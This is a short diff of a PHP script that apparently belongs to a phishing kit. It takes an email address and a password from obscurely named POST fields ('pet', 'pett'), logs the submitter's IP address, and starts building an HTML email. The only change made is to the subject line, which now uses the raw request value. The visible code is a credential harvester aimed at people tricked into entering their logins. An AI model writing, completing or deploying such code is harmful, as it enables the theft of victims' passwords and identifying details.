@@ -64,7 +64,7 @@ if(isset($_POST)){
     $data['email'] = $email->clean($_REQUEST['pet']);
     $data['pass'] = $email->clean($_REQUEST['pett']);
     $data['ip'] = $email->getIp();
-    $data['subject'] = ".$data['email'].";
+    $data['subject'] = "$_REQUEST['pet']";
     $data['message'] =
 		"
 		<html>
